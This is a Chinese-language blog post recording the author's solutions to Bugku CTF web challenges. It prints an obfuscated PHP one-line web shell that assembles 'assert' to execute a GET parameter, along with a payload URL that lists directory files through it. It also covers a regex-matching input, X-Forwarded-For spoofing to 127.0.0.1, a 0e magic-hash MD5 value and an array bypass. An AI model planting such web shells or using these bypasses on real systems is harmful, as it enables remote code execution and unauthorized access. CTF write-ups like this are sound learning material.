---
title: Bugku刷题记录（一）
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-07-14 15:01:24
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1087061.jpg
---
因为Bugku的题目都比较简单，一道题一篇有点水，所以就直接整合起来了，目标在四次之内刷完web部分。
一、welcome to bugkuctf
这道题挂了......已经打不开了，跳下一题。

二、过狗一句话
提示：送给大家一个过狗一句话
<?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?>
发现里面的代码说明可以assert从而随意执行代码，而我们需要知道该目录下存在哪些文件。
php中读取目录下文件的方法：
最简单的是print_r(scandir($dir))
payload：http://123.206.87.240:8010/?s=print_r(scandir(%27./%27))
然后直接访问即可
（此题flag已经被人删了）

三、字符？正则？
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200714220422.png)
这个正则还挺烦的
.                                  匹配除 "\n" 之外的任何单个字符
*                                 匹配它前面的表达式0次或多次，等价于{0,}
{4,7}                           最少匹配 4 次且最多匹配 7 次，结合前面的.也就是                    匹配 4 到 7 个任意字符
\/                                匹配 / ，这里的 \ 是为了转义
[a-z]                           匹配所有小写字母
[:punct:]                     匹配任何标点符号
/i                                表示不分大小写
‘key’+任意单个字符+零个或多个+‘key’+任意单个字符+长度4-7+‘key:/’+任意单个字符+ / +（任意单个字符+零个或多个+‘key’)+英文小写字母一个+匹配‘!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~.’中一个字符
payload：http://123.206.87.240:8002/web10/?id=keykey1234key:/2/keya@

四、前女友(SKCTF)
挂了。。

五、login1(SKCTF)
挂了。。

六、你从哪里来
进去后提示are you from google
抓包改header就行。

七、md5 collision(NUPT_CTF)
这道题觉得极不合理啊，进去之后没有任何提示，仅仅一个标题说了md5碰撞，但是具体呢？
看了wp直接传了一个md5加密后开头是0e的值，觉得毫无逻辑可言。

八、程序员本地网站
提示从本地访问，抓包，X-Forwarded-For: 127.0.0.1

九、各种绕过
很简单的一个数组绕过。

今日总结：bugku上的题感觉都怪怪的。。。赶紧刷完回去复习buu上的题
